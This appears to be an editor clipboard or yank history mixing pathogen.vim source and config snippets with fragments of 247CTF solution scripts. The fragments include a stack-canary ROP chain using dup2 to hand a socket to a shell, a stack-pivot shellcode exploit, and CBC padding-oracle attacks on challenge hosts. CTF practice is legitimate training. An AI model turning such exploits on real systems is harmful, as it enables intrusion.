50275148274e2dca717ad429506b5b3c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/layout.html|104|1|V|html
						<a href="/profile">Profile</a>
						¬∑
	                    <a href="/currencies">Currency Converter</a>
	                    .
						<a href="/contact_us">Contact Us</a>
						¬∑					
1a79a4d60de6718e8e5b326e338ae533|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress-instructions.md|12|7|v|vimwiki
	example
10df90846975507417eadf5a7aea5c71|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress-instructions.md|27|63|^v|vimwiki
	(not included in the repository)
5d9c68c6c50ed3d02a2fcf54f63993b6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/index.html|24|65|v|htmldjango
	testuser
cf9253af7537606d58be61d69e50c582|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/README.md|1|1|V|vimwiki
	This is the code for the paper "auth.js: Advanced Authentication for the Web", which was accepted for publication in the proceedings of ETAA 2020 (3rd International Workshop on Emerging Technologies for Authorization and Authentication).
cd8ddc1e72f1202647773a43a277bff5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/README.md|2|1|V|vimwiki
	It includes the auth.js framework source code, as well as the modifications made to a WordPress website to include the advanced authentication scheme supported by auth.js and instructions on how to make these modifications in WordPress.
00ded208a2a2a932217ed8cc9c13c1d6|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|79|v|python
	50235
0043e8a7feb3ca641e3e2d9fafbf9105|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|22|v|python
	f539f5b0d09742d6
db379ecb5f0cf16c6202869f73803054|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|21|v|python
	'.247ctf.com' 
13683269e32bc8d6313141736b8b661b|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|21|v|python
	6539774e367de8e9.247ctf.com:
13683269e32bc8d6313141736b8b661b|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|21|v|python
	6539774e367de8e9.247ctf.com:
dadff6dd3651f30e8cbbdd26cdbce215|file:///home/neo/247ctf/pwnable/sol_cookie.py|57|16|v|python
	'0.0.0.0'
6074c6aa3488f3c2dddff2a7ca821aab|file:///home/neo/247ctf/pwnable/sol_cookie.py|57|22|v|python
	5555
69dbd58c2e0ab7d099f3768625d44276|file:///home/neo/247ctf/pwnable/sol_cookie.py|57|1|V|python
	    r = remote('0.0.0.0', 5555)
3aa1c60db98b82c217330db0095e90ef|file:///home/neo/247ctf/pwnable/sol_cookie.py|62|1|V|python
	    payload += p32(canary << 2**3)
7b7f31ae425a48e82500b8a92a197188|file:///home/neo/247ctf/pwnable/sol_cookie.py|63|15|v|python
	 p32(canary << 2**3)
803aa5b4b83ef66a1ffe5a51a93b065a|file:///home/neo/247ctf/pwnable/sol_cookie.py|64|1|V|python
	    r.sendline(payload)
243174b58850e0e9ef12b10caad2b823|file:///home/neo/247ctf/pwnable/sol_cookie.py|68|5|V|python
	    print(resp)
8ab112ae399327d6a8f6cf197e160c59|file:///home/neo/247ctf/pwnable/sol_cookie.py|68|10|v|python
	smashing
1bae1ffe86fd8568e569112bfd5d5d01|file:///home/neo/247ctf/pwnable/sol_cookie.py|69|9|V|python
	        log_addr("Canary",canary)
d8f25a2b3b0ae28b3ed0ed8e1f6dac9a|file:///home/neo/247ctf/pwnable/sol_cookie.py|62|5|V|python
	    # payload += p32(canary << 2**3)
b67d2d2317be004061f58e11651446a2|file:///home/neo/247ctf/pwnable/sol_cookie.py|63|5|V|python
	    # r.sendline(payload)
6e1d4a9c9a6969397ce6ec322c817add|file:///home/neo/247ctf/pwnable/sol_cookie.py|56|1|V|python
	# for canary in tqdm(range(2**28)):
872c9b89d45f62e89a5c8605b9a20f9c|file:///home/neo/247ctf/pwnable/sol_cookie.py|62|34|v|python
	 b'\x00'
81ae9750f43696204dfd38d36d866e3e|file:///home/neo/247ctf/pwnable/sol_cookie.py|67|32|v|python
	and resp != b'\n':
4525f5cad8097625462051e76f9c9cb2|file:///home/neo/247ctf/pwnable/sol_cookie.py|60|1|V|python
	        r = remote(host, port)
e9c57f970b06b5e4e71eb298eb76a70b|file:///home/neo/247ctf/pwnable/sol_cookie.py|76|21|v|python
	ADDR
7ce626d46c71c635c48da8336fc73abc|file:///home/neo/247ctf/pwnable/sol_cookie.py|75|21|v|python
	psed
3e5b20bd12a82fdb93363db9e8495017|file:///home/neo/247ctf/pwnable/sol_cookie.py|87|1|V|python
	log.addr('Canary', canary)
61f8ba0696fe114a5bdda2fe065fd313|file:///home/neo/247ctf/pwnable/sol_cookie.py|59|9|V|python
	        # r = remote('0.0.0.0', 5555)
377d9001aa5943b117bfa7f00181d4dc|file:///home/neo/247ctf/pwnable/sol_cookie.py|7|1|V|python
	exe = context.binary = ELF('./cookie_monster')
c16f4c7f3bc58f65fd6ccac7b4335202|file:///home/neo/247ctf/pwnable/sol_cookie.py|74|1|V|python
	canary = 
f6c2534081963707cf2354de8ae7a0c1|file:///home/neo/247ctf/pwnable/sol_cookie.py|79|1|V|python
	payload += canary
5853c18d47db6bf1acc20a6376e1f4af|file:///home/neo/247ctf/pwnable/sol_cookie.py|60|1|V|python
	#         r.recvuntil('!\n')
134deaaa51c618035b3ec12d4613f300|file:///home/neo/247ctf/pwnable/sol_cookie.py|11|1|V|python
	host = args.HOST or '6539774e367de8e9.247ctf.com'
	port = int(args.PORT or 50235) 
461098cb92830259485570ba766e7fca|file:///home/neo/247ctf/pwnable/sol_cookie.py|73|1|V|python
	FD = 4
9778fec96ea1bcbe26e1e9774ce6c4d2|file:///home/neo/247ctf/pwnable/sol_cookie.py|90|5|V|python
	    payload += p32(0)
c0b1013094a9d6a7ce90fe146fd54211|file:///home/neo/247ctf/pwnable/sol_cookie.py|86|5|V|python
	    payload += p32(MAIN)
44aebc7d4be4c4eec344da6e6a50b07f|file:///home/neo/247ctf/pwnable/sol_cookie.py|84|5|V|python
	    # payload += canary
32d8295680bab33156a5f5af92e37036|file:///home/neo/247ctf/pwnable/sol_cookie.py|79|1|V|python
	for fd in range(256):
700f5c88c8efc07513ec72309b106cb0|file:///home/neo/247ctf/pwnable/sol_cookie.py|86|1|V|python
	payload += p32(fd)
ef7e81b85d2f4a378391fc833abf3987|file:///home/neo/247ctf/pwnable/sol_cookie.py|88|1|V|python
	payload += p32(SEND_PLT)
f5cc93f192da1bda8000f5dfeddcf7dd|file:///home/neo/247ctf/pwnable/sol_cookie.py|89|1|V|python
	payload += p32(SEND_GOT)
3540855ca21f2d750ef2afadbb421ad1|file:///home/neo/247ctf/pwnable/sol_cookie.py|89|1|V|python
	payload += p32(FD)
7367ce2f2e0ca7e0338d53d526050276|file:///home/neo/247ctf/pwnable/sol_cookie.py|88|1|V|python
	payload += p32(MAIN)
e372ec65729570a0454584c9943bf49f|file:///home/neo/247ctf/pwnable/sol_cookie.py|51|1|V|python
	password = b'admin123'
372bed643118c1426eaf4d3128107b30|file:///home/neo/247ctf/pwnable/sol_cookie.py|81|1|V|python
	r = remote(host, port)
	r.recvuntil('!\n')
	payload = b'a' * OFFSET
	payload += p32(canary)
	payload += b'a' * 12 # Offset until return addr
1a0471131edc8226b00e0e2f04e523a3|file:///home/neo/247ctf/pwnable/sol_cookie.py|114|1|V|python
	# io.interactive()
58301b5f99d6c9ba80fe6c5a888b08da|file:///home/neo/247ctf/pwnable/sol_cookie.py|112|1|V|python
	payload += p32(4)
01f4e45e54a8c26ea3c4d7d84f0b0ca8|file:///home/neo/247ctf/pwnable/sol_cookie.py|113|1|V|python
	payload += p32(0)
bad5104f93e77d5645aee6ee57a90df6|file:///home/neo/247ctf/pwnable/sol_cookie.py|111|1|V|python
	payload += p32(DUP2)
	payload += p32(0)
	payload += p32(4)
	payload += b'junk'
ba9ac27e27d85362811303945e72993f|file:///home/neo/247ctf/pwnable/sol_cookie.py|116|1|V|python
	payload += p32(1)
ec669920d89aa906e9663d2bd9faaf73|file:///home/neo/247ctf/pwnable/sol_cookie.py|118|1|V|python
	payload += b'junk'
5f6223f158eab3eb37157fcd569fbcb9|file:///home/neo/247ctf/pwnable/sol_cookie.py|111|1|V|python
	payload += p32(DUP2_ADDR)
8d31af80962d9591278a6463c2edb1c3|file:///home/neo/247ctf/pwnable/sol_cookie.py|112|1|V|python
	payload += p32(POP_ESI_EDI_EBP)
8d9ceee0549d911576d34d611c322227|file:///home/neo/247ctf/pwnable/sol_cookie.py|111|27|v|python
	# call dup2(4,0) to copy sockfd to stdin
	payload += p32(POP_ESI_EDI_EBP)
	payload += p32(4)
	payload += p32(0)
a0049e2346670a6ef3bbea2846922972|file:///home/neo/247ctf/pwnable/sol_cookie.py|111|27|v|python
	# call dup2(4,0) to copy sockfd to stdin
430d5c462ae14157e947ba92ef2895d8|file:///home/neo/247ctf/pwnable/sol_pivot.py|78|1|V|python
	io.sendline(b'c'* 24 + p64(XCHG_RSP_RSI))
9a01dfb7d0f08c8b891b5a24832508dd|file:///home/neo/247ctf/pwnable/sol_pivot.py|78|28|v|python
	JMP_RSP
9b46f9c86629a7e6540cb657c4715d56|file:///home/neo/247ctf/pwnable/sol_pivot.py|68|1|V|python
	
	# io.recvuntil('?\n')
	# io.sendline(shellcode)
	# io.recvuntil('?\n')
	# io.sendline(b'c' * 16 + p64(PIVOT) + p64(TEST))
d8b0ea6bd7c72150a7e08eb361270352|file:///home/neo/247ctf/pwnable/sol_pivot.py|74|37|v|python
	+ b'c' * 8 + p64(XCHG_RSP_RSI))
dfd8d2f90b493c09e3ef967b9e6725d5|file:///home/neo/247ctf/pwnable/sol_pivot.py|74|1|V|python
	# io.sendline(b'c'* 24 + p64(JMP_RSP)) 
7686dbf4b2c75473e2dedef8f0dcadff|file:///home/neo/247ctf/pwnable/sol_pivot.py|76|1|V|python
	# shellcode = asm(shellcraft.i386.linux.sh())
1f8a4e1975ddcdfc8b1111746008734e|file:///home/neo/247ctf/pwnable/sol_pivot.py|70|1|V|python
	print(len(sub_rsp_jmp))
5b8f1cc0cfb3e6cd33b502c39418e700|file:///home/neo/247ctf/pwnable/sol_pivot.py|77|13|v|python
	b'c'* 8 + p64(JMP_RSP) + sub_rsp_jmp + p64(XCHG_RSP_RSI)
866a55ca0e3579f6bffb2aa765603c8f|file:///home/neo/247ctf/pwnable/sol_pivot.py|76|95|v|python
	16 bytes back
bcb3292f3ba3c1632d30c36798dcee78|file:///home/neo/247ctf/pwnable/sol_pivot.py|74|35|v|python
	Since stack is executable, the instructions we wrote willl be executed. RSP points to the first buffer where we wrote the shellcode + 0x50, so we 
ddecc260427b448f88f296b1ef62b8a8|file:///home/neo/247ctf/pwnable/sol_pivot.py|10|79|v|python
	50074
1b8bd1d6732026808211471764189275|file:///home/neo/247ctf/pwnable/sol_pivot.py|10|1|v|python
	host = args.HOST or c49f27a42bab2092.247ctf.com
	port = int(args.PORT or 50074)
5e869949acfb04774546912835a1cc93|file:///home/neo/247ctf/pwnable/sol_pivot.py|10|21|v|python
	c49f27a42bab2092.247ctf.com
5e869949acfb04774546912835a1cc93|file:///home/neo/247ctf/pwnable/sol_pivot.py|10|21|v|python
	c49f27a42bab2092.247ctf.com
7959250820ef0985361dbd983ee7722d|file:///home/neo/247ctf/reversing/flag.asm|119|1|V|asm
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001e9      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001eb      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001ed      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001ef      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001f1      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001f3      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001f5      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001f7      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001f9      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001fb      0000           add byte [rax], al
	   ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   0x000001fd      0055aa         add byte [rbp - 0x56], dl
cec0a83d1e59edee1538db74165698e9|file:///home/neo/247ctf/reversing/flag.asm|44|48|v|asm
	jne 0x430017e
f27280e6446ded5dc7f5aa389ab76984|file:///home/neo/247ctf/crypto/sol_nonexistent.py|12|1|V|python
	# URL = b'http://0.0.0.0:4444/encrypt'
1fad93855b086d3a0552bf94570cd032|file:///home/neo/247ctf/crypto/sol_nonexistent.py|13|1|V|python
	alphabet = 'abcdef' + string.digits 
44150444174f0e71fe411b8b0b842652|file:///home/neo/247ctf/crypto/sol_nonexistent.py|16|1|V|python
	    half_flag = 'd4d651b2a63d3ac9'
	    flag = ''
	    fake_block = 'a' * (block_size - 1)
	    fake_block_hex = bytes(fake_block, 'utf-8').hex()
	    iv = bytes.fromhex(session.get(url=URL + b'?plaintext=' + os.urandom(16).hex().encode() + fake_block_hex.encode()).text)[-block_size:].hex()
	    for i in range(block_size):
	        flag_hex = bytes(flag, 'utf-8').hex()
	        fake_block_hex = bytes(fake_block, 'utf-8').hex()
	        encrypted = bytes.fromhex(session.get(url=URL + b'?plaintext=' + iv.encode() + fake_block_hex.encode()).text)
	        previous = encrypted[block_size:block_size * 2]
	        iv = encrypted[-block_size:].hex()
	        target = encrypted[-(2*block_size):-block_size]
	        first_ct_block = encrypted[:block_size]
	        for c in alphabet:
	            fake_test = byte_xor(previous, (half_flag[-len(fake_block):] + flag + c).encode())
	            fake_test = byte_xor(fake_test, first_ct_block).hex()
	            print(fake_test)
	            test_encrypted = session.get(url=URL + b'?plaintext=' + iv.encode() + fake_test.encode()).text
	            # print(test_encrypted)
	            test_block = bytes.fromhex(test_encrypted)[block_size:2 * block_size]
	            iv = bytes.fromhex(test_encrypted)[-block_size:].hex()
	            if test_block == target:
	                flag += c
	                print('flag:',flag)
	                fake_block = fake_block[:-1]
	                session.close()
	                session = requests.Session()
	                iv = bytes.fromhex(session.get(url=URL + b'?plaintext=' + os.urandom(16).hex().encode() + fake_block_hex.encode()).text)[-block_size:].hex()
	                break
	
	
	            # test_block = test_encrypted[-(2 * block_size):-block_size]
	            # iv = test_encrypted[-block_size:].hex()
	            # if test_block == target:
	            #     flag += c
	            #     print(flag)
	            #     fake_block = fake_block[:-1]
	            #     break
a92270c53ada08b9197322d046e2f010|file:///home/neo/247ctf/crypto/sol_nonexistent.py|14|1|V|python
	session = requests.Session()
1a27d614b89606d43c920311a7829245|file:///home/neo/247ctf/crypto/nonexistent.py|42|66|v|python
	secret_admin_password
9ae52a4a8f48239b82b57c852cb5b84c|file:///home/neo/247ctf/crypto/nonexistent.py|15|1|V|python
	    def is_valid_padding(self, s):
	        padding_length = ord(s[0])
	        if padding_length == 0: raise Exception('Invalid padding')
	        for i in range(padding_length):
	            if ord(s[i]) != padding_length:
	                raise Exception('Invalid padding')   
f1a1de0826b01dd911ade7db85c23a6b|file:///home/neo/247ctf/crypto/sol_impossible.py|12|1|V|python
	    encrypted_user = requests.get(url=URL_ENCRYPT + '?user=' + fake_user).text[32:]
b708f418698004316b28f46fe4d5854a|file:///home/neo/247ctf/crypto/sol_nonexistent.py|20|5|v|python
	encrypted_user
a393dee9b2158a2d39457d3a0575e3f0|file:///home/neo/247ctf/crypto/sol_nonexistent.py|21|50|v|python
	fake_user
52b496507c52c758ccb090bc8dce4d4e|file:///home/neo/247ctf/crypto/sol_nonexistent.py|13|1|V|python
	URL = b'https://987abeba170f84bf.247ctf.com/encrypt'
03722466d47d2902d6b5944d24fcdd43|file:///home/neo/247ctf/crypto/sol_nonexistent.py|29|13|V|python
	            print(resp)
48776d8810fb1c203ae0ce31bdd9b700|file:///home/neo/247ctf/crypto/sol_nonexistent.py|18|5|V|python
	    print(fka)
3fdcc51f4e67892e573d303550424678|file:///home/neo/247ctf/crypto/sol_nonexistent.py|24|1|V|python
	        print(fake_pad_block)
c486853b9cd22829a17318d434af2f9a|file:///home/neo/247ctf/crypto/sol_nonexistent.py|28|13|V|python
	            print(payload)
b20c1ca8a1727781f4d27f1d7ce0524a|file:///home/neo/247ctf/crypto/sol_nonexistent.py|18|1|V|python
	    fake_pad_block = bytearray(b'a' * 16)
	    fake_ct = b'b' * 16
	    block = bytearray(b'?' * 16)
	    for pos in range(16):
	        correct_pad = pos + 1
	        for i in range(pos):
	            fake_pad_block[i] = correct_pad ^ block[i]
	        print((fake_pad_block + fake_ct).decode())
	        for b in tqdm(range(256)):
	            fake_pad_block[pos] = b
	            payload = b64encode(fake_pad_block + fake_ct)
	            resp = requests.get(url=URL + b'?password=' + payload).text
	            if 'password' in resp:
	                block[pos] = correct_pad ^ b
	                print(block)
	                break
54d0f76e5f435f19225f6a0eb239cef2|file:///home/neo/247ctf/crypto/nonexistent.py|42|65|v|python
	"secret_admin_password"
23c122af34947f79da2ffb2b51879136|file:///home/neo/247ctf/crypto/sol_nonexistent.py|44|9|V|python
	        print((fake_pad_block + fake_ct).decode())
f6453abaa4014b5687c855d1ac78fe0e|file:///home/neo/247ctf/crypto/sol_nonexistent.py|38|5|V|python
	    first_enc_block = block ^ secret[:16]
9156a6b7a07e72a82d2bed79f8275c6f|file:///home/neo/247ctf/crypto/nonexistent.py|42|65|v|python
	"secret_admin_password
20af09f78485a5dda7b338271eb92dcb|file:///home/neo/247ctf/crypto/sol_nonexistent.py|47|1|V|python
	            resp = requests.get(url=URL + b'?password=' + payload).text
686692b2ba8bec981081308375dba164|file:///home/neo/247ctf/crypto/sol_nonexistent.py|48|37|v|python
	^ first_enc_block[pos]
3c0ae37da8506569ecc6a1556a80b7b1|file:///home/neo/247ctf/crypto/sol_nonexistent.py|46|58|v|python
	first_enc_block[i]
2b4f22a3289559e3e7a473541e4fc0e7|file:///home/neo/247ctf/crypto/sol_nonexistent.py|48|39|v|python
	first_enc_block[pos]
dfabdd0b0f8527cb6a76359bd29f4d42|file:///home/neo/247ctf/crypto/sol_nonexistent.py|46|55|v|python
	 ^ ord('?')
9d1c07a45eb0950878ea7f68ee23ee56|file:///home/neo/247ctf/crypto/sol_nonexistent.py|48|37|v|python
	^ ord('?')
81a113a72302133f80935b3f5e517e54|file:///home/neo/247ctf/crypto/sol_nonexistent.py|38|5|v|python
	first_enc_block
bd62f643e82b9333070d948aab742b7c|file:///home/neo/247ctf/crypto/sol_nonexistent.py|20|5|V|python
	    fake_pad_block
7fcba66303af22626332702e83620b7f|file:///home/neo/247ctf/crypto/sol_nonexistent.py|39|5|V|python
	    fake_first_block = fake_ct
051205506303e02b39e4a4f0819a77d2|file:///home/neo/247ctf/crypto/sol_nonexistent.py|41|15|v|python
	b'c' * 16
9e0d2d28d0afa0895f9e649eeadb203c|file:///home/neo/247ctf/crypto/sol_nonexistent.py|41|1|V|python
	    fake_ct = fake_first_block
e979331b9e6f1f289a3c2c5095a61377|file:///home/neo/247ctf/crypto/sol_nonexistent.py|56|30|V|python
	    second_enc_block = byte_xor(block, secret[16:])
	    second_enc_block = byte_xor(second_enc_block, b'?'*16)
7e517b39b4dcefba7573ca1b7f7c53c4|file:///home/neo/247ctf/crypto/sol_nonexistent.py|57|25|v|python
	fake_pad_block
d9523f962811e54d0ec51c265d341fa8|file:///home/neo/247ctf/crypto/sol_nonexistent.py|52|35|v|python
	and not (pos == 0 and b == 235):
2eef320803a03e03e657aec032d04609|file:///home/neo/.vim/autoload/pathogen.vim|1|1|V|vim
	" pathogen.vim - path option manipulation
	" Maintainer:   Tim Pope <http://tpo.pe/>
	" Version:      2.4
	
	" Install in ~/.vim/autoload (or ~\vimfiles\autoload).
	"
	" For management of individually installed plugins in ~/.vim/bundle (or
	" ~\vimfiles\bundle), adding `execute pathogen#infect()` to the top of your
	" .vimrc is the only other setup necessary.
	"
	" The API is documented inline below.
	
	if exists("g:loaded_pathogen") || &cp
	  finish
	endif
	let g:loaded_pathogen = 1
	
	" Point of entry for basic default usage.  Give a relative path to invoke
	" pathogen#interpose() or an absolute path to invoke pathogen#surround().
	" Curly braces are expanded with pathogen#expand(): "bundle/{}" finds all
	" subdirectories inside "bundle" inside all directories in the runtime path.
	" If no arguments are given, defaults "bundle/{}", and also "pack/{}/start/{}"
	" on versions of Vim without native package support.
	function! pathogen#infect(...) abort
	  if a:0
	    let paths = filter(reverse(copy(a:000)), 'type(v:val) == type("")')
	  else
	    let paths = ['bundle/{}', 'pack/{}/start/{}']
	  endif
	  if has('packages')
	    call filter(paths, 'v:val !~# "^pack/[^/]*/start/[^/]*$"')
	  endif
	  let static = '^\%([$~\\/]\|\w:[\\/]\)[^{}*]*$'
	  for path in filter(copy(paths), 'v:val =~# static')
	    call pathogen#surround(path)
	  endfor
	  for path in filter(copy(paths), 'v:val !~# static')
	    if path =~# '^\%([$~\\/]\|\w:[\\/]\)'
	      call pathogen#surround(path)
	    else
	      call pathogen#interpose(path)
	    endif
	  endfor
	  call pathogen#cycle_filetype()
	  if pathogen#is_disabled($MYVIMRC)
	    return 'finish'
	  endif
	  return ''
	endfunction
	
	" Split a path into a list.
	function! pathogen#split(path) abort
	  if type(a:path) == type([]) | return a:path | endif
	  if empty(a:path) | return [] | endif
	  let split = split(a:path,'\\\@<!\%(\\\\\)*\zs,')
	  return map(split,'substitute(v:val,''\\\([\\,]\)'',''\1'',"g")')
	endfunction
	
	" Convert a list to a path.
	function! pathogen#join(...) abort
	  if type(a:1) == type(1) && a:1
	    let i = 1
	    let space = ' '
	  else
	    let i = 0
	    let space = ''
	  endif
	  let path = ""
	  while i < a:0
	    if type(a:000[i]) == type([])
	      let list = a:000[i]
	      let j = 0
	      while j < len(list)
	        let escaped = substitute(list[j],'[,'.space.']\|\\[\,'.space.']\@=','\\&','g')
	        let path .= ',' . escaped
	        let j += 1
	      endwhile
	    else
	      let path .= "," . a:000[i]
	    endif
	    let i += 1
	  endwhile
	  return substitute(path,'^,','','')
	endfunction
	
	" Convert a list to a path with escaped spaces for 'path', 'tag', etc.
	function! pathogen#legacyjoin(...) abort
	  return call('pathogen#join',[1] + a:000)
	endfunction
	
	" Turn filetype detection off and back on again if it was already enabled.
	function! pathogen#cycle_filetype() abort
	  if exists('g:did_load_filetypes')
	    filetype off
	    filetype on
	  endif
	endfunction
	
	" Check if a bundle is disabled.  A bundle is considered disabled if its
	" basename or full name is included in the list g:pathogen_blacklist or the
	" comma delimited environment variable $VIMBLACKLIST.
	function! pathogen#is_disabled(path) abort
	  if a:path =~# '\~$'
	    return 1
	  endif
	  let sep = pathogen#slash()
	  let blacklist = get(g:, 'pathogen_blacklist', get(g:, 'pathogen_disabled', [])) + pathogen#split($VIMBLACKLIST)
	  if !empty(blacklist)
	    call map(blacklist, 'substitute(v:val, "[\\/]$", "", "")')
	  endif
	  return index(blacklist, fnamemodify(a:path, ':t')) != -1 || index(blacklist, a:path) != -1
	endfunction
	
	" Prepend the given directory to the runtime path and append its corresponding
	" after directory.  Curly braces are expanded with pathogen#expand().
	function! pathogen#surround(path) abort
	  let sep = pathogen#slash()
	  let rtp = pathogen#split(&rtp)
	  let path = fnamemodify(a:path, ':s?[\\/]\=$??')
	  let before = filter(pathogen#expand(path), '!pathogen#is_disabled(v:val)')
	  let after = filter(reverse(pathogen#expand(path, sep.'after')), '!pathogen#is_disabled(v:val[0:-7])')
	  call filter(rtp, 'index(before + after, v:val) == -1')
	  let &rtp = pathogen#join(before, rtp, after)
	  return &rtp
	endfunction
	
	" For each directory in the runtime path, add a second entry with the given
	" argument appended.  Curly braces are expanded with pathogen#expand().
	function! pathogen#interpose(name) abort
	  let sep = pathogen#slash()
	  let name = a:name
	  if has_key(s:done_bundles, name)
	    return ""
	  endif
	  let s:done_bundles[name] = 1
	  let list = []
	  for dir in pathogen#split(&rtp)
	    if dir =~# '\<after$'
	      let list += reverse(filter(pathogen#expand(dir[0:-6].name, sep.'after'), '!pathogen#is_disabled(v:val[0:-7])')) + [dir]
	    else
	      let list += [dir] + filter(pathogen#expand(dir.sep.name), '!pathogen#is_disabled(v:val)')
	    endif
	  endfor
	  let &rtp = pathogen#join(pathogen#uniq(list))
	  return 1
	endfunction
	
	let s:done_bundles = {}
	
	" Invoke :helptags on all non-$VIM doc directories in runtimepath.
	function! pathogen#helptags() abort
	  let sep = pathogen#slash()
	  for glob in pathogen#split(&rtp)
	    for dir in map(split(glob(glob), "\n"), 'v:val.sep."/doc/".sep')
	      if (dir)[0 : strlen($VIMRUNTIME)] !=# $VIMRUNTIME.sep && filewritable(dir) == 2 && !empty(split(glob(dir.'*.txt'))) && (!filereadable(dir.'tags') || filewritable(dir.'tags'))
	        silent! execute 'helptags' pathogen#fnameescape(dir)
	      endif
	    endfor
	  endfor
	endfunction
	
	command! -bar Helptags :call pathogen#helptags()
	
	" Execute the given command.  This is basically a backdoor for --remote-expr.
	function! pathogen#execute(...) abort
	  for command in a:000
	    execute command
	  endfor
	  return ''
	endfunction
	
	" Section: Unofficial
	
	function! pathogen#is_absolute(path) abort
	  return a:path =~# (has('win32') ? '^\%([\\/]\|\w:\)[\\/]\|^[~$]' : '^[/~$]')
	endfunction
	
	" Given a string, returns all possible permutations of comma delimited braced
	" alternatives of that string.  pathogen#expand('/{a,b}/{c,d}') yields
	" ['/a/c', '/a/d', '/b/c', '/b/d'].  Empty braces are treated as a wildcard
	" and globbed.  Actual globs are preserved.
	function! pathogen#expand(pattern, ...) abort
	  let after = a:0 ? a:1 : ''
	  let pattern = substitute(a:pattern, '^[~$][^\/]*', '\=expand(submatch(0))', '')
	  if pattern =~# '{[^{}]\+}'
	    let [pre, pat, post] = split(substitute(pattern, '\(.\{-\}\){\([^{}]\+\)}\(.*\)', "\\1\001\\2\001\\3", ''), "\001", 1)
	    let found = map(split(pat, ',', 1), 'pre.v:val.post')
	    let results = []
	    for pattern in found
	      call extend(results, pathogen#expand(pattern))
	    endfor
	  elseif pattern =~# '{}'
	    let pat = matchstr(pattern, '^.*{}[^*]*\%($\|[\\/]\)')
	    let post = pattern[strlen(pat) : -1]
	    let results = map(split(glob(substitute(pat, '{}', '*', 'g')), "\n"), 'v:val.post')
	  else
	    let results = [pattern]
	  endif
	  let vf = pathogen#slash() . 'vimfiles'
	  call map(results, 'v:val =~# "\\*" ? v:val.after : isdirectory(v:val.vf.after) ? v:val.vf.after : isdirectory(v:val.after) ? v:val.after : ""')
	  return filter(results, '!empty(v:val)')
	endfunction
	
	" \ on Windows unless shellslash is set, / everywhere else.
	function! pathogen#slash() abort
	  return !exists("+shellslash") || &shellslash ? '/' : '\'
	endfunction
	
	function! pathogen#separator() abort
	  return pathogen#slash()
	endfunction
	
	" Convenience wrapper around glob() which returns a list.
	function! pathogen#glob(pattern) abort
	  let files = split(glob(a:pattern),"\n")
	  return map(files,'substitute(v:val,"[".pathogen#slash()."/]$","","")')
	endfunction
	
	" Like pathogen#glob(), only limit the results to directories.
	function! pathogen#glob_directories(pattern) abort
	  return filter(pathogen#glob(a:pattern),'isdirectory(v:val)')
	endfunction
	
	" Remove duplicates from a list.
	function! pathogen#uniq(list) abort
	  let i = 0
	  let seen = {}
	  while i < len(a:list)
	    if (a:list[i] ==# '' && exists('empty')) || has_key(seen,a:list[i])
	      call remove(a:list,i)
	    elseif a:list[i] ==# ''
	      let i += 1
	      let empty = 1
	    else
	      let seen[a:list[i]] = 1
	      let i += 1
	    endif
	  endwhile
	  return a:list
	endfunction
	
	" Backport of fnameescape().
	function! pathogen#fnameescape(string) abort
	  if exists('*fnameescape')
	    return fnameescape(a:string)
	  elseif a:string ==# '-'
	    return '\-'
	  else
	    return substitute(escape(a:string," \t\n*?[{`$\\%#'\"|!<"),'^[+>]','\\&','')
	  endif
	endfunction
	
	" Like findfile(), but hardcoded to use the runtimepath.
	function! pathogen#runtime_findfile(file,count) abort
	  let rtp = pathogen#join(1,pathogen#split(&rtp))
	  let file = findfile(a:file,rtp,a:count)
	  if file ==# ''
	    return ''
	  else
	    return fnamemodify(file,':p')
	  endif
	endfunction
	
	" vim:set et sw=2 foldmethod=expr foldexpr=getline(v\:lnum)=~'^\"\ Section\:'?'>1'\:getline(v\:lnum)=~#'^fu'?'a1'\:getline(v\:lnum)=~#'^endf'?'s1'\:'=':
21ec23f0b1717c00b500eca17580bbe0|file:///home/neo/.vim/coc-settings.json|1|1|V|json
	{
	    "languageserver": {
	        "ccls": {
	            "command": "ccls",
	            "filetypes": [
	                "c",
	                "cpp",
	                "objc",
	                "objcpp"
	            ],
	            "rootPatterns": [
	                ".ccls",
	                "compile_commands.json",
	                ".vim/",
	                ".git/",
	                ".hg/"
	            ],
	            "initializationOptions": {
	                "cache": {
	                    "directory": "/tmp/ccls"
	                }
	            }
	        }
	    },
	    "python.linting.pylintEnabled": true,
	    "python.linting.enabled": true,
	    "java.errors.incompleteClasspath.severity": "ignore"
	}
f163f5bda1abd036567aba0ca3987bbd|file:///home/neo/.zshrc|135|1|V|zsh
	# Load zsh-syntax-highlighting; should be last.
445f3d90161384a76d0ff95b70a16470|untitled:1|1|1|V|
	/usr/share/zsh/plugins/zsh-syntax-highlighting/highlighters/pattern
f394faea6ef02bad21384c628575533a|file:///home/neo/247ctf/misc/sol_try.py|11|5|V|python
	    # operation = b'%2B'
55d8caf80698dce2e735ed60ca5a5802|file:///home/neo/247ctf/misc/sol_try.py|13|5|V|python
	    operation = '-'
